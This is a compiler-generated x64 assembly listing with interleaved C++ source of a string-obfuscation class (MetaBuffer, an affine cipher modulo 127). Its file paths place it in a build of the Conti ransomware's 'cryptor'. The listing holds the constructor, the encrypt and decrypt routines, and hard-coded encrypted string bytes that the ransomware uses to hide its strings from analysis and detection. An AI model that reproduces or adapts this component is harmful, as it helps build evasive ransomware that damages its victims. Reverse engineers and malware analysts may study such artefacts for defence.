?decrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 3d	 mov	 BYTE PTR [rcx+1], 61	; 0000003dH
  00007	c6 41 02 2b	 mov	 BYTE PTR [rcx+2], 43	; 0000002bH
  0000b	c6 41 03 7e	 mov	 BYTE PTR [rcx+3], 126	; 0000007eH
  0000f	c6 41 04 2b	 mov	 BYTE PTR [rcx+4], 43	; 0000002bH
  00013	c6 41 05 70	 mov	 BYTE PTR [rcx+5], 112	; 00000070H
  00017	c6 41 06 2b	 mov	 BYTE PTR [rcx+6], 43	; 0000002bH
  0001b	c6 41 07 69	 mov	 BYTE PTR [rcx+7], 105	; 00000069H
  0001f	c6 41 08 2b	 mov	 BYTE PTR [rcx+8], 43	; 0000002bH
  00023	c6 41 09 0f	 mov	 BYTE PTR [rcx+9], 15
  00027	c6 41 0a 2b	 mov	 BYTE PTR [rcx+10], 43	; 0000002bH
  0002b	c6 41 0b 34	 mov	 BYTE PTR [rcx+11], 52	; 00000034H
  0002f	c6 41 0c 2b	 mov	 BYTE PTR [rcx+12], 43	; 0000002bH
  00033	c6 41 0d 3d	 mov	 BYTE PTR [rcx+13], 61	; 0000003dH
  00037	c6 41 0e 2b	 mov	 BYTE PTR [rcx+14], 43	; 0000002bH
  0003b	c6 41 0f 34	 mov	 BYTE PTR [rcx+15], 52	; 00000034H
  0003f	c6 41 10 2b	 mov	 BYTE PTR [rcx+16], 43	; 0000002bH
  00043	c6 41 11 3c	 mov	 BYTE PTR [rcx+17], 60	; 0000003cH
  00047	c6 41 12 2b	 mov	 BYTE PTR [rcx+18], 43	; 0000002bH
  0004b	c6 41 13 3d	 mov	 BYTE PTR [rcx+19], 61	; 0000003dH
  0004f	c6 41 14 2b	 mov	 BYTE PTR [rcx+20], 43	; 0000002bH
  00053	c6 41 15 7e	 mov	 BYTE PTR [rcx+21], 126	; 0000007eH
  00057	c6 41 16 2b	 mov	 BYTE PTR [rcx+22], 43	; 0000002bH
  0005b	c6 41 17 3d	 mov	 BYTE PTR [rcx+23], 61	; 0000003dH
  0005f	c6 41 18 2b	 mov	 BYTE PTR [rcx+24], 43	; 0000002bH
  00063	c6 41 19 2b	 mov	 BYTE PTR [rcx+25], 43	; 0000002bH
  00067	c6 41 1a 2b	 mov	 BYTE PTR [rcx+26], 43	; 0000002bH
  0006b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0006f	48 8b c1	 mov	 rax, rcx
  00072	c3		 ret	 0
??0?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 2b	 sub	 eax, 43			; 0000002bH
  00006	44 6b c0 37	 imul	 r8d, eax, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 61	 imul	 r8d, eax, 97		; 00000061H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 2b	 add	 r8d, 43			; 0000002bH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ PROC ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<97,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
_TEXT	ENDS
END
